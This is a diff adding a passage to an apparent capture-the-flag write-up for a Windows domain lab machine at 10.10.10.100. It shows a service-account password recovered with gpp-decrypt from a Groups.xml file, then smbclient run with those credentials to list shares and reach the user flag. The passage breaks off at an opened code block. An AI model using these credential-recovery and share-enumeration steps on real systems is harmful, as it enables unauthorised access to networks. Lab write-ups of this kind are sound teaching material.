@@ -149,5 +149,23 @@ sudo python3 gpp-decrypt.py -f ~/Downloads/Groups.xml
 ```
 Now we have the password for the domain TGS service account: GPPstillStandingStrong2k18
 
+Now we can use smbclient again with these credentials to check if we have more shares available:
+```
+smbclient -L //10.10.10.100 -U SVC_TGS%GPPstillStandingStrong2k18
 
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Replication     Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+SMB1 disabled -- no workgroup available
+```
+and we see that we now have the Users share.
+
+We browse to it and find the user flag:
+```
 
